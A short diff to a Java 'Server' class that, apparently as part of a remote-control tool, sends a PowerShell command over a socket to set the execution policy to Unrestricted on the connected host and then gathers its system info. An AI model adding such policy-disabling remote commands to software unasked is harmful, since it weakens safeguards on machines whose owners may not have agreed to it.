@@ -29,6 +29,8 @@ public class Server {
 		din = new DataInputStream(s.getInputStream());
 		
 		System.out.println("Connected");
+		System.out.println("Setting up PowerShell session...");
+		send("Set-ExecutionPolicy Unrestricted -Scope Process");
 		System.out.println("Retrieving system info...");
 		System.out.println(getSysInfo());
 	}
